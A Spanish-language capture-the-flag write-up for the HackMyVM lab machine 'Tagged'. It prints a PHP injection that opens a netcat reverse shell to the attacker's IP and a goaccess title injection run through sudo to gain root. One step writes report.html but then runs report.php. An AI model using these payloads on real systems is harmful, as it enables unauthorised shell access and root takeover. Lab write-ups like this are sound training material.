---
layout: post
title: Tagged - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Sml \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/tagged/tagged.png#center)

## Reconocimiento

Como es de esperar, lo primero es realizar una enumeración de los puertos abiertos en la máquina.

```
$ sudo nmap 192.168.1.18 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 09:15 UTC
Nmap scan report for 192.168.1.18
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
7746/tcp open  unknown

```

**Nota:** El proceso ejecutandose en el puerto **7746** puede dejar de funcionar por culpa de nmap. Para solucionar esto basta con reiniciar la máquina.

### 7746

Probando a conectarme con "netcat" en el puerto 7746, encuentro que nos pide una entrada de usuario. Aquí podemos escribir lo que queramos y nos daremos cuenta que se escribe en "http://tagged.hmv/index.php".

```
$ nc 192.168.1.19 7746
>test
>
```

```
$ curl http://192.168.1.19/index.php
<h1>TAGZ</h1>
<pre>test</pre>
```

Sabiendo esto, puedo conseguir una "reverse shell" en el servidor.

## Explotación

Me vuelvo a conectar al puerto 7746 pero ahora introduzco la siguiente entrada.

```
$ nc 192.168.1.19 7746
><?php system('nc -e /bin/bash 192.168.1.79 1234');?>
>
```

Una vez hecho esto, creo un "listener" en el puerto 1234 y ejecuto el curl

```
$ curl http://192.168.1.19/index.php
```

Nada mas ejecutarlo compruebo que se ha realizado la conexión y tengo shell como www-data.

```
$  nc -lvnp 1234                     
Connection from 192.168.1.19:59908
whoami
www-data
```

## Escalado de privilegios

Al conectarme como www-data veo un archivo "magiccode.go" en /var/www/html. Este parece ser el código fuente del programa que se está ejecutando en el puerto 7746. Lo más interesante es que si la entrada del usuario es "Deva" realiza una "reverse shell" a sí mismo en el puerto 7777.

```
[...]
func main() {
        ln, _ := net.Listen("tcp", ":7746")
        for {
                conn, _ := ln.Accept()
                go receiveData(conn)
                go sendData(conn, "")
        }
}
[...]
OMG := "Deva"
    if message == OMG {
        cmd := exec.Command("nc","-e","/bin/bash","127.0.0.1","7777")
        _ = cmd.Run()
        }
[...]
```

Conociendo esto, creo un "listener" como www-data en el puerto 7777 del servidor y desde mi máquina me vuelvo a conectar al puerto 7746 para enviar "Deva".

```
nc 192.168.1.19 7746
>Deva
>
```

Nada más enviarlo, obtengo una shell como Shyla.

```
www-data@tagged:~/html$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52828
whoami
shyla
```

Ahora siendo Shyla, compruebo que puede ejecutar varios comandos como distintos usuarios (Uma y Root).

```
shyla@tagged:~$ sudo -l
Matching Defaults entries for shyla on tagged:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User shyla may run the following commands on tagged:
    (uma) NOPASSWD: /usr/bin/goaccess
    (ALL) NOPASSWD: /usr/bin/php /var/www/html/report.php
```

[Goaccess](https://goaccess.io/) -> "GoAccess fue diseñado para ser un analizador de registros rápido basado en terminales."

El objetivo es llegar a ser root, lo cual se puede obtener ejecutando php como root robre report.php. Este archivo le pertenece a Uma, por lo que para resolver la máquina es necesario modificar el archivo report.php mediante goaccess y luego ejecutarlo como root. Pues manos a la obra.

- Lo primero es crear un archivo log que goaccess pueda leer
- Despues, utilizo el parametro "--html-report-title" para modificar el título y pasarle el comando bash.
- Al ejecutarlo, obtengo una shell como root.

```
shyla@tagged:~$ touch a.log
shyla@tagged:~$ sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title="<?php system('bash');?>"
shyla@tagged:~$ sudo /usr/bin/php /var/www/html/report.php
root@tagged:/home/shyla# id
uid=0(root) gid=0(root) grupos=0(root)
root@tagged:/home/shyla# :)

```

Muchas gracias  **Sml** por esta máquina.
